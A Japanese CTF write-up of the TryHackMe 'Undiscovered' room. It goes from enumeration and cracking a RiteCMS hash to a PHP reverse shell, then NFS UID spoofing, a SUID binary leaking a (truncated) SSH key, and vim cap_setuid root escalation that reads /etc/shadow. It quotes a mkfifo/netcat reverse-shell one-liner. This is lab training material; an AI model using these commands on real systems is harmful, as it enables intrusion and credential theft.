# Undiscovered CTF

https://tryhackme.com/room/undiscoveredup

## Enumeration

```shell
TARGET=10.201.76.210
sudo bash -c "echo $TARGET   undiscovered.thm >> /etc/hosts"
```

### ポートスキャン

```sh
rustscan -a $TARGET

PORT      STATE SERVICE  REASON
22/tcp    open  ssh      syn-ack ttl 61
80/tcp    open  http     syn-ack ttl 61
111/tcp   open  rpcbind  syn-ack ttl 61
2049/tcp  open  nfs      syn-ack ttl 61
33333/tcp open  dgi-serv syn-ack ttl 61
```

```shell
root@ip-10-201-77-76:~# sudo nmap -sV -p22,80,111,2049,33333 $TARGET
sudo: unable to resolve host ip-10-201-77-76: Name or service not known
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-14 00:06 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for undiscovered.thm (10.201.76.210)
Host is up (0.00077s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.18
111/tcp   open  rpcbind  2-4 (RPC #100000)
2049/tcp  open  nfs      2-4 (RPC #100003)
33333/tcp open  nlockmgr 1-4 (RPC #100021)
MAC Address: 16:FF:DF:B6:D6:8F (Unknown)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP, NFS。nlockmmgr は nfs関係。  
nfsからは情報を得られなかった。

```sh
$ showmount -e $TARGET
clnt_create: RPC: Program not registered
```

### サブドメイン

サブドメインが大量にある。

```shell
$ ffuf -u http://undiscovered.thm -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.undiscovered.thm' -fw 18 

manager                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 357ms]
dashboard               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 428ms]
deliver                 [Status: 200, Size: 4650, Words: 385, Lines: 83, Duration: 443ms]
newsite                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 356ms]
develop                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 359ms]
forms                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 358ms]
network                 [Status: 200, Size: 4584, Words: 385, Lines: 69, Duration: 361ms]
maintenance             [Status: 200, Size: 4668, Words: 385, Lines: 69, Duration: 361ms]
view                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 357ms]
mailgate                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 355ms]
play                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 357ms]
start                   [Status: 200, Size: 4542, Words: 385, Lines: 69, Duration: 358ms]
booking                 [Status: 200, Size: 4599, Words: 385, Lines: 84, Duration: 356ms]
gold                    [Status: 200, Size: 4521, Words: 385, Lines: 69, Duration: 358ms]
terminal                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 358ms]
internet                [Status: 200, Size: 4605, Words: 385, Lines: 69, Duration: 357ms]
resources               [Status: 200, Size: 4626, Words: 385, Lines: 69, Duration: 356ms]
```

### ディレクトリ列挙

```sh
dirb http://undiscovered.thm

---- Scanning URL: http://undiscovered.thm/ ----
==> DIRECTORY: http://undiscovered.thm/images/                                                                           
+ http://undiscovered.thm/index.php (CODE:200|SIZE:355)                                                                  
+ http://undiscovered.thm/server-status (CODE:403|SIZE:281)
```

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

root@ip-10-201-77-76:~# gobuster dir -q -x=txt,php -u http://undiscovered.thm -w ./dirlist.txt -t 64 -k
/.php                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htaccess.txt        (Status: 403) [Size: 281]
/.htaccess.php        (Status: 403) [Size: 281]
/.htpasswd.php        (Status: 403) [Size: 281]
/.htpasswd.txt        (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/images               (Status: 301) [Size: 321] [--> http://undiscovered.thm/images/]
/index.php            (Status: 200) [Size: 355]
/server-status        (Status: 403) [Size: 281]
```

何も出なかった。

## develop.undiscovered.thm

Powered by RiteCMS Version:2.2.1

2.2.1 には、RCEがある。ただし認証が必要。

```sh
$ searchsploit 'RiteCMS' 
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
RiteCMS 1.0.0 - Multiple Vulnerabilities                                          | php/webapps/27315.txt
RiteCMS 2.2.1 - Authenticated Remote Code Execution                               | php/webapps/48636.txt
RiteCMS 2.2.1 - Remote Code Execution (Authenticated)                             | php/webapps/48915.py
RiteCMS 3.1.0 - Arbitrary File Deletion (Authenticated)                           | php/webapps/50615.txt
RiteCMS 3.1.0 - Arbitrary File Overwrite (Authenticated)                          | php/webapps/50614.txt
RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)                       | php/webapps/50616.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

[デフォルト認証は admin/admin](https://www.exploit-db.com/exploits/48636)

しかし、http://develop.undiscovered.thm/cms が存在しないので実行できなかった。

## deliver.undiscovered.thm

deliver.undiscovered.thm の下に /cms があったが、admin/admin でログインできなかった。

```sh
root@ip-10-201-77-76:~# gobuster dir -q -x=txt,php -u http://deliver.undiscovered.thm -w ./dirlist.txt -t 64 -k
/cms                  (Status: 301) [Size: 334] [--> http://deliver.undiscovered.thm/cms/]
/data                 (Status: 301) [Size: 335] [--> http://deliver.undiscovered.thm/data/]
/files                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/files/]
/index.php            (Status: 200) [Size: 4650]
/INSTALL.txt          (Status: 200) [Size: 1088]
/js                   (Status: 301) [Size: 333] [--> http://deliver.undiscovered.thm/js/]
/LICENSE              (Status: 200) [Size: 32472]
/media                (Status: 301) [Size: 336] [--> http://deliver.undiscovered.thm/media/]
/README.txt           (Status: 200) [Size: 439]
/templates            (Status: 301) [Size: 340]
```

/data の下にある、sqlite.user.initial.sql を見ると、下記のようにINSERTしている。
```sql
INSERT INTO rite_userdata VALUES(1, 'admin', 1, '75470d05abd21fb5e84e735d2bc595e2f7ecc5c7a5e98ad0d7', 1230764400, 0);
```

userdataファイルをsqliteビューアで見ると、実際には下記が入っていることが分かった。  
これがハッシュなのか何なのか不明。

```
009dbadbcd5c49a89011b47c8cb27a81fcc0f2be54669bfcb8
```

ソースを見る。  
https://github.com/handylulu/RiteCMS/blob/a120d8c374344d07406c00b0ffdad6923cb66272/cms/includes/functions.admin.inc.php#L23

sha1ハッシュで、50文字中、先頭40文字がハッシュ、最後の10文字がソルトと判明。

```sh
function is_pw_correct($pw,$hash)
 {
  if(strlen($hash)==50) // salted sha1 hash with salt
   {
    $salted_hash = substr($hash,0,40);
    $salt = substr($hash,40,10);
    if(sha1($pw.$salt)==$salted_hash) return true;
    else return false;
   }
  else return false;
 }
```

`54669bfcb8` がソルトで、`009dbadbcd5c49a89011b47c8cb27a81fcc0f2be` がハッシュ。

hashcatでクラック成功。
```sh
.\hashcat.exe -m 110 hash.txt rockyou.txt
```

ログインし、/cms からPHPをアップロード。

```sh
$ nc -nlvp 6666    
listening on [any] 6666 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.76.210] 54830
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 08:35:39 up  1:36,  0 users,  load average: 0.00, 0.02, 0.61
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

シェル取得成功！

## 権限昇格１

2ユーザーが存在する。

```sh
www-data@undiscovered:/$ ls /home
leonard  william

www-data@undiscovered:/$ id leonard
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)

www-data@undiscovered:/$ id william
uid=3003(william) gid=3003(william) groups=3003(william)
```

```sh
www-data@undiscovered:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william   *(rw,root_squash)
```

マウント

```sh
$ sudo mount -o rw $TARGET:/home/william ./tmp
```

攻撃マシンに、williamユーザーを作成

```sh
$ sudo useradd -u 3003 william
```

```sh
$ sudo su william                   

$ id
uid=3003(william) gid=3003(william) groups=3003(william)

$ ls -al ./tmp
total 44
drwxr-x--- 4 nobody nogroup 4096 Sep 10  2020 .
drwxrwxr-x 3 kali   kali    4096 Sep 14 09:46 ..
-rwxr-xr-x 1 root   root     128 Sep  4  2020 admin.sh
-rw------- 1 root   root       0 Sep  9  2020 .bash_history
-rw-r--r-- 1 nobody nogroup 3771 Sep  4  2020 .bashrc
drwx------ 2 nobody nogroup 4096 Sep  4  2020 .cache
drwxrwxr-x 2 nobody nogroup 4096 Sep  4  2020 .nano
-rw-r--r-- 1 nobody nogroup   43 Sep  4  2020 .profile
-rwsrwsr-x 1 nobody nogroup 8776 Sep  4  2020 script
-rw-r----- 1 root   nogroup   38 Sep 10  2020 user.txt
```

```sh
$ cat ./tmp/admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"
    
    exit 0
```

scriptをリバース

```c
undefined8 main(undefined8 param_1,long param_2)
{
  long in_FS_OFFSET;
  char local_78 [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if (*(long *)(param_2 + 8) == 0) {
    system("./admin.sh");
  }
  else {
    setreuid(0x3ea,0x3ea);
    builtin_strncpy(local_78,"/bin/cat /home/leonard/",0x18);
    strcat(local_78,*(char **)(param_2 + 8));
    system(local_78);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

0x3ea=1002 は leonard

ターゲット上で /home/william/script を実行できれば、/home/leonard 配下のファイルを cat できる。どうやって実行するかが問題。

kali上でパーミッションを変更できた。

```sh
$ chmod 777 /tmp/script
```

leonard の id_rsa を入手できた。

```sh
www-data@undiscovered:/home/william$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
...
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
```

## 権限昇格２

developerグループに注目。

```sh
leonard@undiscovered:~$ id
uid=1002(leonard) gid=1002(leonard) groups=1002(leonard),3004(developer)
```

vim が developer グループになっている。SUIDが付いているなら簡単だが・・・。

```sh
leonard@undiscovered:~$ find / -group developer -type f -not -path "/proc/*" 2>/dev/null
/usr/bin/vim.basic

leonard@undiscovered:~$ ls -al /usr/bin/vim.basic
-rwxr-xr-- 1 root developer 2437320 Mar 19  2020 /usr/bin/vim.basic
```

.viminfo をみると、下記のようなログが残っていた。

```sh
-'  1  0  :py3 import os;os.setuid(0);os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.68.129 1337 >/tmp/f")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  1  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
-'  3  0  :py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")
```

vimで下記実行したら、rootユーザーのパスワードハッシュを入手できた。

```
:py3 import os;os.setuid(0);os.system("cat /etc/shadow")
```

## 振り返り

- なぜ deliver サブドメインが darker なのか意味不明。
- getcapで、setuid属性を調べていたら速やかに分かったはず。テンプレの実行優先度を上げる。

```sh
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
```
